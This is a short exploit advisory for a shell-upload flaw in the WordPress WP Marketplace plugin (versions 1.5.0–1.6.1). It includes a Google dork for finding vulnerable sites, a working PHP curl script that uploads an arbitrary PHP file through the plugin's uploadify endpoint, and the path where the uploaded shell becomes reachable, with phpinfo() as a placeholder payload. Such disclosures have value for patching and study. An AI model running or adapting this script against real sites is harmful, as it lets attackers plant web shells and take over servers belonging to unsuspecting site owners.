##################################################
# Description : Wordpress Plugins - WP Marketplace Shell Upload 
Vulnerability
# Version : 1.5.0 - 1.6.1
# Link : http://wordpress.org/extend/plugins/wpmarketplace/
# Plugins : http://downloads.wordpress.org/plugin/wpmarketplace.zip
# Date : 26-05-2012
# Google Dork : inurl:/wp-content/plugins/wpmarketplace/
# Author : Sammy FORGIT - sam at opensyscom dot fr - 
http://www.opensyscom.fr
##################################################


Exploit :

PostShell.php
<?php

$uploadfile="lo.php";
$ch = 
curl_init("http://www.exemple.com/wordpress/wp-content/plugins/wpmarketplace/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('Filedata'=>"@$uploadfile",
         
'folder'=>'/wordpress/wp-content/plugins/wpmarketplace/uploadify/'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access : 
http://www.exemple.com/wordpress/wp-content/plugins/wpmarketplace/uploadify/
Filename : $postResult output

lo.php
<?php
phpinfo();
?>
